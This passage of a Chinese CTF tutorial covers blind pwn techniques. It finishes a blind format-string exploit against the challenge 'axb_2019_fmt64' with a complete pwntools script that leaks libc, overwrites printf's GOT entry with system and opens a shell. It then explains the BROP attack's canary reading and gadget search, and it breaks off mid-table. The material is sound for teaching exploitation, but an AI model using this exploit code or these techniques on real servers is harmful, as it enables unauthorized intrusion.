<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/dm/1024_646_/t01d689975adf67465a.png"><img src="%E7%9B%B2%E6%89%93/t01d689975adf67465a.png" alt="img"></a></p>
<p>显然这里给Sub_400670传入的是回显的内容，那么Sub_400670应为puts函数。</p>
<p>给Sub_4006D0传入了0、字符串地址、长度，则Sub_4006D0应当为read函数。</p>
<p>给Sub_4006F0同时传入了我们输入的字符串地址和一个新的字符串地址，于是怀疑是sprintf函数。</p>
<p>最后的Sub_4006A0传入了给Sub_4006F0传入的新函数地址，于是怀疑是printf函数。</p>
<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/dm/1024_127_/t010b5d3e64aa4b71f8.png"><img src="%E7%9B%B2%E6%89%93/t010b5d3e64aa4b71f8.png" alt="img"></a></p>
<p><strong>泄露printf的got表地址</strong></p>
<p>我们接下来泄露<code>printf@plt</code>也就是<code>0x4006D0</code>处的指令内容，以获取<code>printf@got</code>的位置。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf_plt=<span class="number">0x4006D0</span></span><br><span class="line">payload = <span class="string">&#x27;Leak---&gt;%10$s&lt;-|&#x27;</span>+p64(printf_plt)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Repeater:Leak---&gt;&#x27;</span>)</span><br><span class="line">print(disasm(sh.recvuntil(<span class="string">&#x27;&lt;-|&#x27;</span>).strip(<span class="string">&#x27;&lt;-|&#x27;</span>)))</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/dm/1024_401_/t01074c61686b9ae4ca.png"><img src="%E7%9B%B2%E6%89%93/t01074c61686b9ae4ca.png" alt="img"></a></p>
<p>但是发现，根据<code>disasm</code>的信息，<code>printf@plt</code>并没有存放<code>printf@got</code>的地址。此处我们决定重新泄露文件，将起始点设为<code>0x400600</code>。</p>
<p><a target="_blank" rel="noopener" href="https://p5.ssl.qhimg.com/dm/1024_896_/t017b493ad9cc2876ad.png"><img src="%E7%9B%B2%E6%89%93/t017b493ad9cc2876ad.png" alt="img"></a></p>
<p>发现分析结果有了较为明显的变化。</p>
<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/dm/1024_640_/t0130c47bd15d45d561.png"><img src="%E7%9B%B2%E6%89%93/t0130c47bd15d45d561.png" alt="img"></a></p>
<p>我们相应的点进去就可以获知其<code>.plt.got</code>地址。</p>
<p>于是我们可以获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strlen@.plt.got:0x601020</span><br><span class="line">setbuf@.plt.got:0x601028</span><br><span class="line">printf@.plt.got:0x601030</span><br><span class="line">read  @.plt.got:0x601048</span><br><span class="line">puts  @.plt.got:0x601018</span><br></pre></td></tr></table></figure>
<p><strong>Leak libc &amp; Final exp</strong></p>
<p>现在，我们只需要获取<code>puts@.plt.got</code>的内容即可计算出libc基址，并且劫持got表地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file_name=ELF(&quot;./&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&quot;./axb_2019_fmt64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">where_is_start</span>(<span class="params">ret_index=null</span>):</span></span><br><span class="line">    return_addr=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">        payload = <span class="string">&#x27;%%%d$p&lt;--|&#x27;</span> % (i)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Repeater:&#x27;</span>)</span><br><span class="line">        val = sh.recvuntil(<span class="string">&#x27;&lt;--|&#x27;</span>)</span><br><span class="line">        log.info(<span class="built_in">str</span>(i*<span class="number">8</span>).ljust(<span class="number">4</span>)+<span class="string">&#x27; &#x27;</span>+val.strip(<span class="string">&#x27;&lt;--|&#x27;</span>).ljust(<span class="number">10</span>))</span><br><span class="line">        <span class="keyword">if</span>(i*<span class="number">4</span>==ret_index):</span><br><span class="line">            return_addr=<span class="built_in">int</span>(val.strip(<span class="string">&#x27;&lt;--|&#x27;</span>).ljust(<span class="number">10</span>)[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">return</span> return_addr</span><br><span class="line">        <span class="comment"># sh.recvrepeat(0.2)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_text</span>(<span class="params">start_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    text_segment=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            payload = <span class="string">&#x27;Leak---&gt;%10$s&lt;-|&#x27;</span>+p64(start_addr)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">            <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">            sh.send(payload)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Repeater:Leak---&gt;&#x27;</span>)</span><br><span class="line">            value = sh.recvuntil(<span class="string">&#x27;&lt;-|&#x27;</span>).strip(<span class="string">&#x27;&lt;-|&#x27;</span>)</span><br><span class="line">            text_segment += value</span><br><span class="line">            start_addr += <span class="built_in">len</span>(value)</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(value)==<span class="number">0</span>):</span><br><span class="line">                text_segment += <span class="string">&#x27;x00&#x27;</span></span><br><span class="line">                start_addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(text_segment[-<span class="number">9</span>:-<span class="number">1</span>]==<span class="string">&#x27;x00&#x27;</span>*<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        log.info(<span class="string">&#x27;We get &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(text_segment)) +<span class="string">&#x27;byte file!&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;axb_2019_fmt64_dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">            fout.write(text_segment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">antitone_fmt_payload</span>(<span class="params">offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span></span>):</span></span><br><span class="line">    config = &#123;</span><br><span class="line">        <span class="number">32</span> : &#123;</span><br><span class="line">            <span class="string">&#x27;byte&#x27;</span>: (<span class="number">4</span>, <span class="number">1</span>, <span class="number">0xFF</span>, <span class="string">&#x27;hh&#x27;</span>, <span class="number">8</span>),</span><br><span class="line">            <span class="string">&#x27;short&#x27;</span>: (<span class="number">2</span>, <span class="number">2</span>, <span class="number">0xFFFF</span>, <span class="string">&#x27;h&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">            <span class="string">&#x27;int&#x27;</span>: (<span class="number">1</span>, <span class="number">4</span>, <span class="number">0xFFFFFFFF</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">32</span>)&#125;,</span><br><span class="line">        <span class="number">64</span> : &#123;</span><br><span class="line">            <span class="string">&#x27;byte&#x27;</span>: (<span class="number">8</span>, <span class="number">1</span>, <span class="number">0xFF</span>, <span class="string">&#x27;hh&#x27;</span>, <span class="number">8</span>),</span><br><span class="line">            <span class="string">&#x27;short&#x27;</span>: (<span class="number">4</span>, <span class="number">2</span>, <span class="number">0xFFFF</span>, <span class="string">&#x27;h&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">            <span class="string">&#x27;int&#x27;</span>: (<span class="number">2</span>, <span class="number">4</span>, <span class="number">0xFFFFFFFF</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> write_size <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;byte&#x27;</span>, <span class="string">&#x27;short&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]:</span><br><span class="line">        log.error(<span class="string">&quot;write_size must be &#x27;byte&#x27;, &#x27;short&#x27; or &#x27;int&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    number, step, mask, formatz, decalage = config[context.bits][write_size]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    payload_last = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> where,what <span class="keyword">in</span> writes.items():</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,number*step,step):</span><br><span class="line">            payload_last += pack(where+i)</span><br><span class="line"></span><br><span class="line">    fmtCount = <span class="number">0</span></span><br><span class="line">    payload_forward = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    key_toadd = []</span><br><span class="line">    key_offset_fmtCount = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> where,what <span class="keyword">in</span> writes.items():</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,number):</span><br><span class="line">            current = what &amp; mask</span><br><span class="line">            <span class="keyword">if</span> numbwritten &amp; mask &lt;= current:</span><br><span class="line">                to_add = current - (numbwritten &amp; mask)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                to_add = (current | (mask+<span class="number">1</span>)) - (numbwritten &amp; mask)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> to_add != <span class="number">0</span>:</span><br><span class="line">                key_toadd.append(to_add)</span><br><span class="line">                payload_forward += <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(to_add)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                key_toadd.append(to_add)</span><br><span class="line">            payload_forward += <span class="string">&quot;%&#123;&#125;$&#123;&#125;n&quot;</span>.<span class="built_in">format</span>(offset + fmtCount, formatz)</span><br><span class="line">            key_offset_fmtCount.append(offset + fmtCount)</span><br><span class="line">            <span class="comment">#key_formatz.append(formatz)</span></span><br><span class="line"></span><br><span class="line">            numbwritten += to_add</span><br><span class="line">            what &gt;&gt;= decalage</span><br><span class="line">            fmtCount += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    len1 = <span class="built_in">len</span>(payload_forward)</span><br><span class="line"></span><br><span class="line">    key_temp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key_offset_fmtCount)):</span><br><span class="line">        key_temp.append(key_offset_fmtCount[i])</span><br><span class="line"></span><br><span class="line">    x_add = <span class="number">0</span></span><br><span class="line">    y_add = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        x_add = len1 / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">        y_add = <span class="number">8</span> - (len1 % <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key_temp)):</span><br><span class="line">            key_temp[i] = key_offset_fmtCount[i] + x_add</span><br><span class="line"></span><br><span class="line">        payload_temp = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,number):</span><br><span class="line">            <span class="keyword">if</span> key_toadd[i] != <span class="number">0</span>:</span><br><span class="line">                payload_temp += <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(key_toadd[i])</span><br><span class="line">            payload_temp += <span class="string">&quot;%&#123;&#125;$&#123;&#125;n&quot;</span>.<span class="built_in">format</span>(key_temp[i], formatz)</span><br><span class="line"></span><br><span class="line">        len2 = <span class="built_in">len</span>(payload_temp)</span><br><span class="line"></span><br><span class="line">        xchange = y_add - (len2 - len1)</span><br><span class="line">        <span class="keyword">if</span> xchange &gt;= <span class="number">0</span>:</span><br><span class="line">            payload = payload_temp + xchange*<span class="string">&#x27;a&#x27;</span> + payload_last</span><br><span class="line">            <span class="keyword">return</span> payload</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            len1 = len2</span><br><span class="line"></span><br><span class="line"><span class="comment"># start_addr=where_is_start(720)</span></span><br><span class="line"><span class="comment"># start_addr=0x400720</span></span><br><span class="line"><span class="comment"># start_addr=0x400600</span></span><br><span class="line"><span class="comment"># dump_text(start_addr)</span></span><br><span class="line">printf_got=<span class="number">0x601030</span></span><br><span class="line">puts_got=<span class="number">0x601018</span></span><br><span class="line">payload = <span class="string">&#x27;Leak---&gt;%10$s&lt;-|&#x27;</span>+p64(puts_got)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Repeater:Leak---&gt;&#x27;</span>)</span><br><span class="line">printf_addr=u64(sh.recvuntil(<span class="string">&#x27;&lt;-|&#x27;</span>).strip(<span class="string">&#x27;&lt;-|&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">libc_addr=printf_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr=libc_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc base address is &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(libc_addr)))</span><br><span class="line">log.success(<span class="string">&quot;system address is &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">payload=antitone_fmt_payload(<span class="number">8</span>, &#123;printf_got:system_addr&#125;, numbwritten=<span class="number">9</span>, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;;/bin/shx00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment"># print(sh.recv())</span></span><br></pre></td></tr></table></figure>


<h2 id="0x04-Blind-Return-Oriented-Programming-Attack-BROP"><a href="#0x04-Blind-Return-Oriented-Programming-Attack-BROP" class="headerlink" title="0x04 Blind Return Oriented Programming Attack(BROP)"></a>0x04 Blind Return Oriented Programming Attack(BROP)</h2><h3 id="原理简述-1"><a href="#原理简述-1" class="headerlink" title="原理简述"></a>原理简述</h3><p>BROP攻击基于一篇发表在Oakland 2014的论文<strong>Hacking Blind</strong>，作者是来自Standford的Andrea Bittau，以下是相关paper和slide的链接：<a target="_blank" rel="noopener" href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">paper</a>、<a target="_blank" rel="noopener" href="http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf">slide</a>。</p>
<p>以及BROP的原网站地址：<a target="_blank" rel="noopener" href="http://www.scs.stanford.edu/brop/">Blind Return Oriented Programming (BROP) Website</a></p>
<p><strong>BROP攻击的目标和前提条件</strong></p>
<p>目标：通过ROP的方法远程攻击某个应用程序，劫持该应用程序的控制流。我们可以不需要知道该应用程序的源代码或者任何二进制代码，该应用程序可以被现有的一些保护机制如NX, ASLR, PIE, 以及stack canaries等保护，应用程序所在的服务器可以是32位系统或者64位系统。</p>
<p>初看这个目标感觉实现起来特别困难。其实这个攻击有两个前提条件的：</p>
<ul>
<li>必须先存在一个已知的stack overflow的漏洞，而且攻击者知道如何触发这个漏洞；</li>
<li>服务器进程在crash之后会重新复活，并且复活的进程不会被re-rand（意味着虽然有ASLR的保护，但是复活的进程和之前的进程的地址随机化是一样的）。这个需求其实是合理的，因为当前像nginx, MySQL, Apache, OpenSSH, Samba等服务器应用都是符合这种特性的。</li>
</ul>
<p><strong>BROP的攻击流程 1 – 远程dump内存</strong></p>
<p>由于我们不知道被攻击程序的内存布局，所以首先要做的事情就是通过某种方法从远程服务器dump出该程序的内存到本地，为了做到这点我们需要调用一个系统调用<code>write</code>，传入一个socket文件描述符，如下所示：</p>
<blockquote>
<p>write(int sock, void *buf, int len)</p>
</blockquote>
<p>将这条系统调用转换成4条汇编指令，如图所示：</p>
<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t01164dfbca7ca64a95.png"><img src="%E7%9B%B2%E6%89%93/t01164dfbca7ca64a95.png" alt="img"></a></p>
<p>所以从ROP攻击的角度来看，我们只需要找到四个相应的gadget，然后在栈上构造好这4个gadget的内存地址，依次进行顺序调用就可以了。</p>
<p>但是问题是我们现在连内存分布都不知道，该如何在内存中找到这4个gadgets呢？特别是当系统部署了ASLR和stack canaries等保护机制，似乎这件事就更难了。</p>
<p>所以我们先将这个问题放一放，在脑袋里记着这个目标，先来做一些准备工作。</p>
<p><strong>攻破Stack Canaries防护</strong></p>
<p>如果不知道什么是<code>stack canaries</code>可以先看<a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">这里</a>，简单来说就是在栈上的<code>return address</code>下面放一个随机生成的数（成为canary），在函数返回时进行检查，如果发现这个canary被修改了（可能是攻击者通过buffer overflow等攻击方法覆盖了），那么就报错。</p>
<p>那么如何攻破这层防护呢？一种方法是brute-force暴力破解，但这个很低效，这里作者提出了一种叫做“stack reading”的方法：</p>
<p>假设这是我们想要overflow的栈的布局：</p>
<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t011e7f430259c2d2ec.png"><img src="%E7%9B%B2%E6%89%93/t011e7f430259c2d2ec.png" alt="img"></a></p>
<p>我们可以尝试任意多次来判断出overflow的长度（直到进程由于canary被破坏crash了，在这里即为<code>4096+8=4104</code>个字节），之后我们将这4096个字节填上任意值，然后一个一个字节顺序地进行尝试来还原出真实的canary，比如说，我们将第4097个字节填为<code>x</code>，如果<code>x</code>和原来的canary中的第一个字节是一样的话，那么进程不会crash，否则我们尝试下一个<code>x</code>的可能性，在这里，由于一个字节只有256种可能，所以我们只要最多尝试256次就可以找到canary的某个正确的字节，直到我们得到8个完整的canary字节，该流程如下图所示：</p>
<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/t0122a8bc04a518aefb.png"><img src="%E7%9B%B2%E6%89%93/t0122a8bc04a518aefb.png" alt="img"></a></p>
<p>我们同样可以用这种方法来得到保存好的<code>frame pointer</code>和<code>return address</code>。</p>
<p><strong>寻找<code>stop gadget</code></strong></p>
<p>到目前为止，我们已经得到了合适的canary来绕开stack canary的保护, 接下来的目标就是找到之前提到的4个gadgets。</p>
<p>在寻找这些特定的gadgets之前，我们需要先来介绍一种特殊的gadget类型：<code>stop gadget</code>.</p>
<p>一般情况下，如果我们把栈上的<code>return address</code>覆盖成某些我们随意选取的内存地址的话，程序有很大可能性会挂掉（比如，该<code>return address</code>指向了一段代码区域，里面会有一些对空指针的访问造成程序crash，从而使得攻击者的连接（connection）被关闭）。但是，存在另外一种情况，即该<code>return address</code>指向了一块代码区域，当程序的执行流跳到那段区域之后，程序并不会crash，而是进入了无限循环，这时程序仅仅是hang在了那里，攻击者能够一直保持连接状态。于是，我们把这种类型的gadget，称为<code>stop gadget</code>，这种gadget对于寻找其他gadgets取到了至关重要的作用。</p>
<p><strong>寻找可利用的（potentially useful）gadgets</strong></p>
<p>假设现在我们找到了某个可以造成程序block住的<code>stop gadget</code>，比如一个无限循环，或者某个blocking的系统调用（<code>sleep</code>），那么我们该如何找到其他 <code>useful gadgets</code>呢？（这里的“useful”是指有某些功能的gadget，而不是会造成crash的gadget）。</p>
<p>到目前为止我们还是只能对栈进行操作，而且只能通过覆盖<code>return address</code>来进行后续的操作。假设现在我们猜到某个<code>useful gadget</code>，比如<code>pop rdi; ret</code>, 但是由于在执行完这个gadget之后进程还会跳到栈上的下一个地址，如果该地址是一个非法地址，那么进程最后还是会crash，在这个过程中攻击者其实并不知道这个<code>useful gadget</code>被执行过了（因为在攻击者看来最后的效果都是进程crash了），因此攻击者就会认为在这个过程中并没有执行到任何的<code>useful gadget</code>，从而放弃它，这个步骤如下图所示：</p>
<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t01317f3ecc6e86b3f8.png"><img src="%E7%9B%B2%E6%89%93/t01317f3ecc6e86b3f8.png" alt="img"></a></p>
<p>但是，如果我们有了<code>stop gadget</code>，那么整个过程将会很不一样. 如果我们在需要尝试的<code>return address</code>之后填上了足够多的<code>stop gadgets</code>，如下图所示：</p>
<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t0158fb2a0edb29dfaa.png"><img src="%E7%9B%B2%E6%89%93/t0158fb2a0edb29dfaa.png" alt="img"></a></p>
<p>那么任何会造成进程crash的gadget最后还是会造成进程crash，而那些<code>useful gadget</code>则会进入block状态。尽管如此，还是有一种特殊情况，即那个我们需要尝试的gadget也是一个<code>stop gadget</code>，那么如上所述，它也会被我们标识为<code>useful gadget</code>。不过这并没有关系，因为之后我们还是需要检查该<code>useful gadget</code>是否是我们想要的gadget.</p>
<p><strong>最后一步：远程dump内存</strong></p>
<p>到目前为止，似乎准备工作都做好了，我们已经可以绕过canary防护，并且得到很多不会造成进程crash的“potential useful gadget”了，那么接下来就是该如何找到我们之前所提到的那四个gadgets呢？</p>
<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t01ae3d96b5b86adb08.png"><img src="%E7%9B%B2%E6%89%93/t01ae3d96b5b86adb08.png" alt="img"></a></p>
<p>如上图所示，为了找到前两个gadgets：<code>pop %rsi; ret</code>和<code>pop %rdi; ret</code>，我们只需要找到一种所谓的<code>BROP gadget</code>就可以了，这种gadget很常见，它做的事情就是恢复那些<code>callee saved registers</code>. 而对它进行一个偏移就能够生成<code>pop %rdi</code>和<code>pop %rsi</code>这两个gadgets.</p>
<p>不幸的是<code>pop %rdx; ret</code>这个gadget并不容易找到，它很少出现在代码里, 所以作者提出一种方法，相比于寻找<code>pop %rdx</code>指令，他认为可以利用<code>strcmp</code>这个函数调用，该函数调用会把字符串的长度赋值给<code>%rdx</code>，从而达到相同的效果。另外<code>strcmp</code>和<code>write</code>调用都可以在程序的Procedure Linking Table (PLT)里面找到.</p>
<p>所以接下来的任务就是：</p>
<ul>
<li>找到所谓的<code>BROP Gadget</code>；</li>
<li>找到对应的PLT项。</li>
</ul>
<p><strong>寻找<code>BROP Gadget</code></strong></p>
<p>事实上<code>BROP gadgets</code>特别特殊，因为它需要顺序地从栈上<code>pop</code> 6个值然后执行<code>ret</code>。所以如果我们利用之前提到的<code>stop gadget</code>的方法就可以很容易找到这种特殊的gadget了，我们只需要在<code>stop gadget</code>之前填上6个会造成crash的地址:</p>
<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t012e7a87015815966f.png"><img src="%E7%9B%B2%E6%89%93/t012e7a87015815966f.png" alt="img"></a></p>
<p>如果任何<code>useful gadget</code>满足这个条件且不会crash的话，那么它基本上就是<code>BROP gadgets</code>了。</p>
<p><strong>寻找PLT项</strong></p>
<p><a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Dynamic_linking">PLT</a>是一个跳转表，它的位置一般在可执行程序开始的地方，该机制主要被用来给应用程序调用外部函数（比如libc等），具体的细节可以看相关的Wiki。它有一个非常独特的signature：每一个项都是16个字节对齐，其中第0个字节开始的地址指向改项对应函数的fast path，而第6个字节开始的地址指向了该项对应函数的slow path：</p>
<p><a target="_blank" rel="noopener" href="https://p5.ssl.qhimg.com/t01cc2b388606f7aec2.png"><img src="%E7%9B%B2%E6%89%93/t01cc2b388606f7aec2.png" alt="img"></a></p>
<p>另外，大部分的PLT项都不会因为传进来的参数的原因crash，因为它们很多都是系统调用，都会对参数进行检查，如果有错误会返回EFAULT而已，并不会造成进程crash。所以攻击者可以通过下面这个方法找到PLT：如果攻击者发现好多条连续的16个字节对齐的地址都不会造成进程crash，而且这些地址加6得到的地址也不会造成进程crash，那么很有可能这就是某个PLT对应的项了。</p>
<p>那么当我们得到某个PLT项，我们该如何判断它是否是<code>strcmp</code>或者<code>write</code>呢？</p>
<p>对于<code>strcmp</code>来说, 作者提出的方法是对其传入不同的参数组合，通过该方法调用返回的结果来进行判断。由于<code>BROP gadget</code>的存在，我们可以很方便地控制前两个参数，<code>strcmp</code>会发生如下的可能性：</p>
<table>
<thead>
<tr>
<th align="center">arg1</th>
<th align="center">arg2</th>
<th align="center">result</th>
</tr>
</thead>
<tbody><tr>
<td align="center">readable</td>
<td align="center">0x0</td>
<td align="center">crash</td>
</tr>
<tr>
<td align="center">0x0</td>
<td align="center">readable</td>
